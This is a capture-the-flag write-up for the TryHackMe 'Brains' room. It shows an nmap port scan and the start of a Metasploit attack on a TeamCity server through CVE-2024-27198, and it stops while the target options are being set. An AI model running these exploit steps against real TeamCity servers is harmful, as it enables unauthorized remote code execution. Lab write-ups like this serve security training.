![Nmap Scan](Theme%20Brains.JPG)
> 🧠 Room: [Brains](https://tryhackme.com/room/brains)  
> 📅 Date: April 6, 2025  
> 🛡️ Goal: Gain reverse shell & capture the flag  
> 🚨 CVE used: CVE-2024-27198

# RED exploit the server!
# 1. First Step: run in the Terminal "nmap -p- <Target_IP_Address>"

```bash
nmap -p- 10.10.252.192
````
1. "nmap" -> The network scanner tool
2. "-p-"  -> Scans all ports (from 1 to 65535). By default, Nmap scans only the top 1000 most common ports.
3. "<Target_IP_Address>" -> The IP address of the target — in the case of the Brains room
![Nmap Scan](Brain%20Room%20Nmap%20scan.JPG)

# What ports are open and why they matter: 
1. 22/tcp → ssh (This port is used for Secure Shell (SSH) — remote access to the machine via terminal.)
2. 80/tcp → HTTP (This is the default HTTP port, used to serve websites.)
3. 50000/tcp → ibm-db2 (detected by default) This is not a common service for this port. In this specific room (Brains), this port is hosting a TeamCity server, vulnerable to CVE-2024-27198.

# 2. Second Step: What port should we investigate further + Using Metasploit (msfconsole) to Exploit the TeamCity Vulnerability

*The most interesting one here is Port 50000: even though it's labeled ibm-db2, it actually runs TeamCity, which is vulnerable to authentication bypass and remote code execution (RCE).*
```bash
msfconsole
```
1. "msfconsole" -> This launches the Metasploit interface.

```bash
search teamcity
```
1. "search teamcity" -> This will list available exploit modules related to TeamCity
2. Look for one like: exploit/multi/http/jetbrains_teamcity_rce_cve_2024_27198

#  Use the module:
```bash
use exploit/multi/http/jetbrains_teamcity_rce_cve_2024_27198
```
# After loading an exploit module in Metasploit, you should always run: 
```bash
options
```
1. "options" -> This command shows you all the configurable parameters for the selected module
   
![Nmap Scan](Brain%20Room%20exploit%20run.JPG)

*We need to set the correct options before running the exploit.*
```bash
set RHOSTS 10.10.252.192     # Target IP address
set RPORT 50000              # Target port where TeamCity is running
```
*


